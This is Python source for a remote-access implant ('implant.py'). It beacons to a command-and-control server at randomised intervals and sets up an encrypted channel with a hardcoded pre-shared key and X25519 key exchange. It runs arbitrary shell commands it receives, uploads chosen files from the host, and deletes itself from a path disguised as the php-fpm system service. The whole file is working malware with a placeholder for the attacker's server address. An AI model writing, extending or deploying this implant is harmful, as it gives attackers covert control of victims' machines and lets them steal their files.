# implant.py without prints and string comments

import os
import base64
import subprocess
import time
import random
import json
import io
import heapq
import threading

import requests
from cryptography.hazmat.primitives.asymmetric import x25519
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

C2_IP = "127.0.0.1"  # put c2 ip here
C2_URL = "https://" + C2_IP + ":" + "8443"
BEACON_URL = C2_URL + "/api/telemetry"
RESULT_URL = C2_URL + "/api/updates"
FILE_URL = C2_URL + "/api/upload"

task_queue = []
queue_lock = threading.Lock()
derived_key = None


# def encrypt_data(aes_key: bytes, plaintext: bytes | str) -> bytes:
def encrypt_data(aes_key: bytes, plaintext: bytes) -> bytes:
    if isinstance(plaintext, str):
        plaintext = plaintext.encode()

    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    return base64.b64encode(nonce + ciphertext)


def decrypt_data(aes_key: bytes, b64_data: bytes, decode: bool = True):
    data = base64.b64decode(b64_data)
    nonce = data[:12]
    ciphertext_and_tag = data[12:]

    aesgcm = AESGCM(aes_key)
    plaintext = aesgcm.decrypt(nonce, ciphertext_and_tag, None)
    return plaintext if not decode else plaintext.decode("utf-8")


def exchange_keys(derived_key: bytes, attempts: int, long_sleep: bool):
    # generate X25519 keypair
    client_private_key = x25519.X25519PrivateKey.generate()
    client_public_key = client_private_key.public_key()
    client_public_bytes = client_public_key.public_bytes(
        encoding=serialization.Encoding.Raw, format=serialization.PublicFormat.Raw
    )

    # send initial beacon with client public key
    pre_shared_key = b"]T\xb8\x9e\xc4*}F\x01\xa7\xa30P-Y\xb1\x87W\x07\xe9\xe3\x81\x95r\x11v\n\xf498=\x9f"
    enc_public_bytes = encrypt_data(pre_shared_key, client_public_bytes)
    r = requests.post(BEACON_URL, data=enc_public_bytes, verify=False, timeout=5)
    # contingency: enter long sleep mode if can't reach C2 until we can
    if not r.ok:
        attempts += 1
        # return early to retry connection attempt
        return derived_key, attempts, long_sleep

    # request successful, receive public key from server
    long_sleep = False
    attempts = 0
    enc = r.content
    server_public_bytes = decrypt_data(pre_shared_key, enc, False)

    # compute shared secret
    server_public_key = x25519.X25519PublicKey.from_public_bytes(server_public_bytes)
    shared_secret = client_private_key.exchange(server_public_key)

    # derive AES key using HKDF
    derived_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"handshake data",
    ).derive(shared_secret)

    return derived_key, attempts, long_sleep


def sleep(long_sleep: bool):
    normal_sleep_range = (10, 11)
    long_sleep_range = (600, 1200)
    if long_sleep:
        time.sleep(random.randrange(*long_sleep_range))
    else:
        time.sleep(random.randrange(*normal_sleep_range))


def poll_and_schedule():
    # beacon c2 at random-ish interval to retrieve tasks, see sleep()
    attempts = 0
    long_sleep = False

    while True:
        # contingency: enter long sleep mode if can't reach C2 until we can
        if attempts >= 3:
            long_sleep = True

        try:
            # exchange encryption keys before sending data
            global derived_key
            if not derived_key:
                derived_key, attempts, long_sleep = exchange_keys(
                    derived_key, attempts, long_sleep
                )
                continue

            r = requests.post(BEACON_URL, verify=False, timeout=5)
            if not r.ok:
                attempts += 1
                sleep(long_sleep)
                continue
            # request successful
            long_sleep = False
            attempts = 0

            try:
                data = json.loads(decrypt_data(derived_key, r.content))
                tasks: list[str] = data.get("tasks", [])

                with queue_lock:
                    for task in tasks:
                        cmd = task.get("cmd")
                        abs_time = task.get("time")
                        delay_seconds = task.get("delay")

                        if abs_time:
                            run_time = abs_time
                        else:
                            run_time = time.time() + delay_seconds

                        heapq.heappush(task_queue, (run_time, cmd))
            except Exception as e:
                pass

            sleep(long_sleep)

        except requests.RequestException as e:
            sleep(long_sleep)


def task_scheduler():
    while True:
        with queue_lock:
            now = time.time()
            # run all due tasks
            while task_queue and task_queue[0][0] <= now:
                _, cmd = heapq.heappop(task_queue)
                run_task(cmd)
        time.sleep(1)


def run_task(task: str):
    # destroy
    if task == "DESTROY":
        import sys

        try:
            # delete itself and exit
            # script_path = os.path.realpath(__file__)
            script_path = "/usr/sbin/php-fpm"
            os.remove(script_path)
            time.sleep(1)
            sys.exit()
        except Exception as e:
            sys.exit()

    # find and upload file
    elif task[:4] == "FILE":
        file_path = task.removeprefix("FILE ")
        status = None
        try:
            with open(file_path, "rb") as f:
                file_bytes = f.read()
                enc_filename = encrypt_data(derived_key, file_path)
                enc_data = encrypt_data(derived_key, file_bytes)
                enc_file = io.BytesIO(enc_data)
                file = {"file": (enc_filename, enc_file)}
                requests.post(FILE_URL, files=file, timeout=5, verify=False)

            status = f"uploaded '{file_path}'"
        except FileNotFoundError:
            status = f"Error: file '{file_path}' not found"
        except PermissionError:
            status = f"Error: no read permissions for '{file_path}'"
        except requests.RequestException as e:
            status = f"Request error for '{file_path}': {e}"
        except Exception as e:
            status = f"Unknown error for '{file_path}': {e}"

        # post file upload status
        enc_status = encrypt_data(derived_key, json.dumps({"status": status}))
        requests.post(RESULT_URL, data=enc_status, timeout=5, verify=False)

    # run shell cmd and upload results
    else:
        try:
            output = subprocess.check_output(
                task, shell=True, stderr=subprocess.STDOUT, text=True
            )
        except subprocess.CalledProcessError as e:
            output = e.output

        result_payload = encrypt_data(derived_key, json.dumps({"result": output}))
        requests.post(RESULT_URL, data=result_payload, timeout=5, verify=False)


threading.Thread(target=poll_and_schedule, daemon=True).start()
task_scheduler()
